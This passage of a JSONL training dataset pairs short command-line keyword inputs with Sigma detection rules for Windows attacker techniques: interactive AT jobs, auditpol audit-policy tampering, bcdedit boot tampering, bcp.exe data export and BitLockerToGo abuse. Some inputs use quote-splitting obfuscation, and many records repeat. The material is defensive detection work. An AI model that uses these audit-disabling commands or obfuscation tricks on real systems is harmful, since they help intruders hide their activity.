filter_main_builtin:\n        CommandLine|contains:\n            - 'animations'\n            - 'audiodescription'\n            - 'caretbrowsing'\n            - 'caretwidth'\n            - 'colorfiltering'\n            - 'cursorindicator'\n            - 'cursorscheme'\n            - 'filterkeys'\n            - 'focusborderheight'\n            - 'focusborderwidth'\n            - 'highcontrast'\n            - 'keyboardcues'\n            - 'keyboardpref'\n            - 'livecaptions'\n            - 'magnifierpane'\n            - 'messageduration'\n            - 'minimumhitradius'\n            - 'mousekeys'\n            - 'Narrator'\n            - 'osk'\n            - 'overlappedcontent'\n            - 'showsounds'\n            - 'soundsentry'\n            - 'speechreco'\n            - 'stickykeys'\n            - 'togglekeys'\n            - 'voiceaccess'\n            - 'windowarranging'\n            - 'windowtracking'\n            - 'windowtrackingtimeout'\n            - 'windowtrackingzorder'\n    filter_optional_java:\n        CommandLine|contains: 'Oracle_JavaAccessBridge'\n    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*\nfalsepositives:\n    - Legitimate, non-default assistive technology applications execution\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\at.exe interactive", "output": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\nstatus: test\ndescription: Detects an interactive AT job, which may be used as a form of privilege escalation.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1053.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"a\"\"t\"\".\"\"e\"\"x\"\"e\" interactive", "output": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\nstatus: test\ndescription: Detects an interactive AT job, which may be used as a form of privilege escalation.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1053.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\at interactive", "output": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\nstatus: test\ndescription: Detects an interactive AT job, which may be used as a form of privilege escalation.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1053.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\at.exe interactive", "output": "title: Interactive AT Job\nid: 60fc936d-2eb0-4543-8a13-911c750a1dfc\nstatus: test\ndescription: Detects an interactive AT job, which may be used as a form of privilege escalation.\nreferences:\n    - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1053.002/T1053.002.md\n    - https://eqllib.readthedocs.io/en/latest/analytics/d8db43cf-ed52-4f5c-9fb3-c9a4b95a0b56.html\nauthor: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community\ndate: 2019-10-24\nmodified: 2021-11-27\ntags:\n    - attack.privilege-escalation\n    - attack.t1053.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\at.exe'\n        CommandLine|contains: 'interactive'\n    condition: selection\nfalsepositives:\n    - Unlikely (at.exe deprecated as of Windows 8)\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/logon:none /system:none /sam:none /privilege:none /object:none /process:none /policy:none", "output": "title: Audit Policy Tampering Via NT Resource Kit Auditpol\nid: c6c56ada-612b-42d1-9a29-adad3c5c2c1e\nrelated:\n    - id: 0a13e132-651d-11eb-ae93-0242ac130002 # New auditpol version\n      type: similar\nstatus: test\ndescription: |\n    Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\n    This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '/logon:none'\n            - '/system:none'\n            - '/sam:none'\n            - '/privilege:none'\n            - '/object:none'\n            - '/process:none'\n            - '/policy:none'\n    condition: selection\nfalsepositives:\n    - The old auditpol utility isn't available by default on recent versions of Windows as it was replaced by a newer version. The FP rate should be very low except for tools that use a similar flag structure\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/logon:none /system:none /sam:none /privilege:none /object:none /\"p\"\"r\"\"o\"\"c\"\"e\"\"s\"\"s\"\":\"\"n\"\"o\"\"n\"\"e\" /policy:none", "output": "title: Audit Policy Tampering Via NT Resource Kit Auditpol\nid: c6c56ada-612b-42d1-9a29-adad3c5c2c1e\nrelated:\n    - id: 0a13e132-651d-11eb-ae93-0242ac130002 # New auditpol version\n      type: similar\nstatus: test\ndescription: |\n    Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\n    This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '/logon:none'\n            - '/system:none'\n            - '/sam:none'\n            - '/privilege:none'\n            - '/object:none'\n            - '/process:none'\n            - '/policy:none'\n    condition: selection\nfalsepositives:\n    - The old auditpol utility isn't available by default on recent versions of Windows as it was replaced by a newer version. The FP rate should be very low except for tools that use a similar flag structure\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "/logon:none /system:none /sam:none /privilege:none /object:none /process:none /policy:none", "output": "title: Audit Policy Tampering Via NT Resource Kit Auditpol\nid: c6c56ada-612b-42d1-9a29-adad3c5c2c1e\nrelated:\n    - id: 0a13e132-651d-11eb-ae93-0242ac130002 # New auditpol version\n      type: similar\nstatus: test\ndescription: |\n    Threat actors can use an older version of the auditpol binary available inside the NT resource kit to change audit policy configuration to impair detection capability.\n    This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://github.com/3CORESec/MAL-CL/tree/master/Descriptors/Windows%202000%20Resource%20Kit%20Tools/AuditPol\nauthor: Nasreddine Bencherchali (Nextron Systems)\ndate: 2021-12-18\nmodified: 2023-02-21\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '/logon:none'\n            - '/system:none'\n            - '/sam:none'\n            - '/privilege:none'\n            - '/object:none'\n            - '/process:none'\n            - '/policy:none'\n    condition: selection\nfalsepositives:\n    - The old auditpol utility isn't available by default on recent versions of Windows as it was replaced by a newer version. The FP rate should be very low except for tools that use a similar flag structure\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\auditpol.exe AUDITPOL.EXE disable clear remove restore", "output": "title: Audit Policy Tampering Via Auditpol\nid: 0a13e132-651d-11eb-ae93-0242ac130002\nrelated:\n    - id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e # Old auditpol\n      type: similar\nstatus: test\ndescription: |\n  Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\n  This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps)\ndate: 2021-02-02\nmodified: 2023-02-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\auditpol.exe'\n        - OriginalFileName: 'AUDITPOL.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'disable' # disables a specific audit policy\n            - 'clear'   # delete or clears audit policy\n            - 'remove'  # removes an audit policy\n            - 'restore' # restores an audit policy\n    condition: all of selection_*\nfalsepositives:\n    - Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\auditpol.exe\" AUDITPOL.EXE disable clear remove restore", "output": "title: Audit Policy Tampering Via Auditpol\nid: 0a13e132-651d-11eb-ae93-0242ac130002\nrelated:\n    - id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e # Old auditpol\n      type: similar\nstatus: test\ndescription: |\n  Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\n  This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps)\ndate: 2021-02-02\nmodified: 2023-02-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\auditpol.exe'\n        - OriginalFileName: 'AUDITPOL.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'disable' # disables a specific audit policy\n            - 'clear'   # delete or clears audit policy\n            - 'remove'  # removes an audit policy\n            - 'restore' # restores an audit policy\n    condition: all of selection_*\nfalsepositives:\n    - Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\auditpol AUDITPOL disable clear remove restore", "output": "title: Audit Policy Tampering Via Auditpol\nid: 0a13e132-651d-11eb-ae93-0242ac130002\nrelated:\n    - id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e # Old auditpol\n      type: similar\nstatus: test\ndescription: |\n  Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\n  This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps)\ndate: 2021-02-02\nmodified: 2023-02-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\auditpol.exe'\n        - OriginalFileName: 'AUDITPOL.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'disable' # disables a specific audit policy\n            - 'clear'   # delete or clears audit policy\n            - 'remove'  # removes an audit policy\n            - 'restore' # restores an audit policy\n    condition: all of selection_*\nfalsepositives:\n    - Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\auditpol.exe clear restore disable AUDITPOL.EXE remove", "output": "title: Audit Policy Tampering Via Auditpol\nid: 0a13e132-651d-11eb-ae93-0242ac130002\nrelated:\n    - id: c6c56ada-612b-42d1-9a29-adad3c5c2c1e # Old auditpol\n      type: similar\nstatus: test\ndescription: |\n  Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\n  This can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\nreferences:\n    - https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/\nauthor: Janantha Marasinghe (https://github.com/blueteam0ps)\ndate: 2021-02-02\nmodified: 2023-02-22\ntags:\n    - attack.defense-evasion\n    - attack.t1562.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\auditpol.exe'\n        - OriginalFileName: 'AUDITPOL.EXE'\n    selection_cli:\n        CommandLine|contains:\n            - 'disable' # disables a specific audit policy\n            - 'clear'   # delete or clears audit policy\n            - 'remove'  # removes an audit policy\n            - 'restore' # restores an audit policy\n    condition: all of selection_*\nfalsepositives:\n    - Administrator or administrator scripts might leverage the flags mentioned in the detection section. Either way, it should always be monitored\nlevel: high"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcdedit.exe bcdedit.exe delete deletevalue import safeboot network", "output": "title: Potential Ransomware or Unauthorized MBR Tampering Via Bcdedit.EXE\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: test\ndescription: Detects potential malicious and unauthorized usage of bcdedit.exe\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\n    - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2\nauthor: '@neu5ron'\ndate: 2019-02-07\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1542.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcdedit.exe'\n        - OriginalFileName: 'bcdedit.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'delete'\n            - 'deletevalue'\n            - 'import'\n            - 'safeboot'\n            - 'network'\n    condition: all of selection_*\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcdedit.exe bcdedit.exe delete \"delet\"evalue import safeboot network", "output": "title: Potential Ransomware or Unauthorized MBR Tampering Via Bcdedit.EXE\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: test\ndescription: Detects potential malicious and unauthorized usage of bcdedit.exe\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\n    - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2\nauthor: '@neu5ron'\ndate: 2019-02-07\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1542.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcdedit.exe'\n        - OriginalFileName: 'bcdedit.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'delete'\n            - 'deletevalue'\n            - 'import'\n            - 'safeboot'\n            - 'network'\n    condition: all of selection_*\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcdedit bcdedit delete deletevalue import safeboot network", "output": "title: Potential Ransomware or Unauthorized MBR Tampering Via Bcdedit.EXE\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: test\ndescription: Detects potential malicious and unauthorized usage of bcdedit.exe\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\n    - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2\nauthor: '@neu5ron'\ndate: 2019-02-07\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1542.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcdedit.exe'\n        - OriginalFileName: 'bcdedit.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'delete'\n            - 'deletevalue'\n            - 'import'\n            - 'safeboot'\n            - 'network'\n    condition: all of selection_*\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcdedit.exe bcdedit.exe delete deletevalue import safeboot network", "output": "title: Potential Ransomware or Unauthorized MBR Tampering Via Bcdedit.EXE\nid: c9fbe8e9-119d-40a6-9b59-dd58a5d84429\nstatus: test\ndescription: Detects potential malicious and unauthorized usage of bcdedit.exe\nreferences:\n    - https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/bcdedit--set\n    - https://twitter.com/malwrhunterteam/status/1372536434125512712/photo/2\nauthor: '@neu5ron'\ndate: 2019-02-07\nmodified: 2023-02-15\ntags:\n    - attack.defense-evasion\n    - attack.t1070\n    - attack.persistence\n    - attack.t1542.003\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcdedit.exe'\n        - OriginalFileName: 'bcdedit.exe'\n    selection_cli:\n        CommandLine|contains:\n            - 'delete'\n            - 'deletevalue'\n            - 'import'\n            - 'safeboot'\n            - 'network'\n    condition: all of selection_*\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcp.exe BCP.exe out queryout", "output": "title: Data Export From MSSQL Table Via BCP.EXE\nid: c615d676-f655-46b9-b913-78729021e5d7\nstatus: experimental\ndescription: |\n    Detects the execution of the BCP utility in order to export data from the database.\n    Attackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file.\nreferences:\n    - https://docs.microsoft.com/en-us/sql/tools/bcp-utility\n    - https://asec.ahnlab.com/en/61000/\n    - https://asec.ahnlab.com/en/78944/\n    - https://www.huntress.com/blog/attacking-mssql-servers\n    - https://www.huntress.com/blog/attacking-mssql-servers-pt-ii\n    - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/\n    - https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\nauthor: Omar Khaled (@beacon_exe), MahirAli Khan (in/mahiralikhan), Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-08-20\ntags:\n    - attack.execution\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcp.exe'\n        - OriginalFileName: 'BCP.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' out ' # Export data from a table\n            - ' queryout ' # Export data based on a SQL query\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate data export operations.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\"\\bcp.exe\" BCP.exe out queryout", "output": "title: Data Export From MSSQL Table Via BCP.EXE\nid: c615d676-f655-46b9-b913-78729021e5d7\nstatus: experimental\ndescription: |\n    Detects the execution of the BCP utility in order to export data from the database.\n    Attackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file.\nreferences:\n    - https://docs.microsoft.com/en-us/sql/tools/bcp-utility\n    - https://asec.ahnlab.com/en/61000/\n    - https://asec.ahnlab.com/en/78944/\n    - https://www.huntress.com/blog/attacking-mssql-servers\n    - https://www.huntress.com/blog/attacking-mssql-servers-pt-ii\n    - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/\n    - https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\nauthor: Omar Khaled (@beacon_exe), MahirAli Khan (in/mahiralikhan), Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-08-20\ntags:\n    - attack.execution\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcp.exe'\n        - OriginalFileName: 'BCP.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' out ' # Export data from a table\n            - ' queryout ' # Export data based on a SQL query\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate data export operations.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcp BCP out queryout", "output": "title: Data Export From MSSQL Table Via BCP.EXE\nid: c615d676-f655-46b9-b913-78729021e5d7\nstatus: experimental\ndescription: |\n    Detects the execution of the BCP utility in order to export data from the database.\n    Attackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file.\nreferences:\n    - https://docs.microsoft.com/en-us/sql/tools/bcp-utility\n    - https://asec.ahnlab.com/en/61000/\n    - https://asec.ahnlab.com/en/78944/\n    - https://www.huntress.com/blog/attacking-mssql-servers\n    - https://www.huntress.com/blog/attacking-mssql-servers-pt-ii\n    - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/\n    - https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\nauthor: Omar Khaled (@beacon_exe), MahirAli Khan (in/mahiralikhan), Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-08-20\ntags:\n    - attack.execution\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcp.exe'\n        - OriginalFileName: 'BCP.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' out ' # Export data from a table\n            - ' queryout ' # Export data based on a SQL query\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate data export operations.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\bcp.exe out BCP.exe queryout", "output": "title: Data Export From MSSQL Table Via BCP.EXE\nid: c615d676-f655-46b9-b913-78729021e5d7\nstatus: experimental\ndescription: |\n    Detects the execution of the BCP utility in order to export data from the database.\n    Attackers were seen saving their malware to a database column or table and then later extracting it via \"bcp.exe\" into a file.\nreferences:\n    - https://docs.microsoft.com/en-us/sql/tools/bcp-utility\n    - https://asec.ahnlab.com/en/61000/\n    - https://asec.ahnlab.com/en/78944/\n    - https://www.huntress.com/blog/attacking-mssql-servers\n    - https://www.huntress.com/blog/attacking-mssql-servers-pt-ii\n    - https://news.sophos.com/en-us/2024/08/07/sophos-mdr-hunt-tracks-mimic-ransomware-campaign-against-organizations-in-india/\n    - https://research.nccgroup.com/2018/03/10/apt15-is-alive-and-strong-an-analysis-of-royalcli-and-royaldns/\nauthor: Omar Khaled (@beacon_exe), MahirAli Khan (in/mahiralikhan), Nasreddine Bencherchali (Nextron Systems)\ndate: 2024-08-20\ntags:\n    - attack.execution\n    - attack.exfiltration\n    - attack.t1048\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith: '\\bcp.exe'\n        - OriginalFileName: 'BCP.exe'\n    selection_cli:\n        CommandLine|contains:\n            - ' out ' # Export data from a table\n            - ' queryout ' # Export data based on a SQL query\n    condition: all of selection_*\nfalsepositives:\n    - Legitimate data export operations.\nlevel: medium"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\BitLockerToGo.exe", "output": "title: BitLockerTogo.EXE Execution\nid: 7f2376f9-42ee-4dfc-9360-fecff9a88fc8\nstatus: test\ndescription: |\n    Detects the execution of \"BitLockerToGo.EXE\".\n    BitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\n    This is a rarely used application and usage of it at all is worth investigating.\n    Malware such as Lumma stealer has been seen using this process as a target for process hollowing.\nreferences:\n    - https://tria.ge/240521-ynezpagf56/behavioral1\n    - https://any.run/report/6eea2773c1b4b5c6fb7c142933e220c96f9a4ec89055bf0cf54accdcde7df535/a407f006-ee45-420d-b576-f259094df091\n    - https://bazaar.abuse.ch/sample/8c75f8e94486f5bbf461505823f5779f328c5b37f1387c18791e0c21f3fdd576/\n    - https://bazaar.abuse.ch/sample/64e6605496919cd76554915cbed88e56fdec10dec6523918a631754664b8c8d3/\nauthor: Josh Nickels, mttaggart\ndate: 2024-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\BitLockerToGo.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of BitLockerToGo.exe to encrypt portable devices.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\\"\\BitLockerToGo.exe\\\"", "output": "title: BitLockerTogo.EXE Execution\nid: 7f2376f9-42ee-4dfc-9360-fecff9a88fc8\nstatus: test\ndescription: |\n    Detects the execution of \"BitLockerToGo.EXE\".\n    BitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\n    This is a rarely used application and usage of it at all is worth investigating.\n    Malware such as Lumma stealer has been seen using this process as a target for process hollowing.\nreferences:\n    - https://tria.ge/240521-ynezpagf56/behavioral1\n    - https://any.run/report/6eea2773c1b4b5c6fb7c142933e220c96f9a4ec89055bf0cf54accdcde7df535/a407f006-ee45-420d-b576-f259094df091\n    - https://bazaar.abuse.ch/sample/8c75f8e94486f5bbf461505823f5779f328c5b37f1387c18791e0c21f3fdd576/\n    - https://bazaar.abuse.ch/sample/64e6605496919cd76554915cbed88e56fdec10dec6523918a631754664b8c8d3/\nauthor: Josh Nickels, mttaggart\ndate: 2024-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\BitLockerToGo.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of BitLockerToGo.exe to encrypt portable devices.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\BitLockerToGo", "output": "title: BitLockerTogo.EXE Execution\nid: 7f2376f9-42ee-4dfc-9360-fecff9a88fc8\nstatus: test\ndescription: |\n    Detects the execution of \"BitLockerToGo.EXE\".\n    BitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\n    This is a rarely used application and usage of it at all is worth investigating.\n    Malware such as Lumma stealer has been seen using this process as a target for process hollowing.\nreferences:\n    - https://tria.ge/240521-ynezpagf56/behavioral1\n    - https://any.run/report/6eea2773c1b4b5c6fb7c142933e220c96f9a4ec89055bf0cf54accdcde7df535/a407f006-ee45-420d-b576-f259094df091\n    - https://bazaar.abuse.ch/sample/8c75f8e94486f5bbf461505823f5779f328c5b37f1387c18791e0c21f3fdd576/\n    - https://bazaar.abuse.ch/sample/64e6605496919cd76554915cbed88e56fdec10dec6523918a631754664b8c8d3/\nauthor: Josh Nickels, mttaggart\ndate: 2024-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\BitLockerToGo.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of BitLockerToGo.exe to encrypt portable devices.\nlevel: low"}
{"instruction": "Write Sigma rule to detect payload:", "input": "\\BitLockerToGo.exe", "output": "title: BitLockerTogo.EXE Execution\nid: 7f2376f9-42ee-4dfc-9360-fecff9a88fc8\nstatus: test\ndescription: |\n    Detects the execution of \"BitLockerToGo.EXE\".\n    BitLocker To Go is BitLocker Drive Encryption on removable data drives. This feature includes the encryption of, USB flash drives, SD cards, External hard disk drives, Other drives that are formatted by using the NTFS, FAT16, FAT32, or exFAT file system.\n    This is a rarely used application and usage of it at all is worth investigating.\n    Malware such as Lumma stealer has been seen using this process as a target for process hollowing.\nreferences:\n    - https://tria.ge/240521-ynezpagf56/behavioral1\n    - https://any.run/report/6eea2773c1b4b5c6fb7c142933e220c96f9a4ec89055bf0cf54accdcde7df535/a407f006-ee45-420d-b576-f259094df091\n    - https://bazaar.abuse.ch/sample/8c75f8e94486f5bbf461505823f5779f328c5b37f1387c18791e0c21f3fdd576/\n    - https://bazaar.abuse.ch/sample/64e6605496919cd76554915cbed88e56fdec10dec6523918a631754664b8c8d3/\nauthor: Josh Nickels, mttaggart\ndate: 2024-07-11\ntags:\n    - attack.defense-evasion\n    - attack.t1218\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        Image|endswith: '\\BitLockerToGo.exe'\n    condition: selection\nfalsepositives:\n    - Legitimate usage of BitLockerToGo.exe to encrypt portable devices.\nlevel: low"}
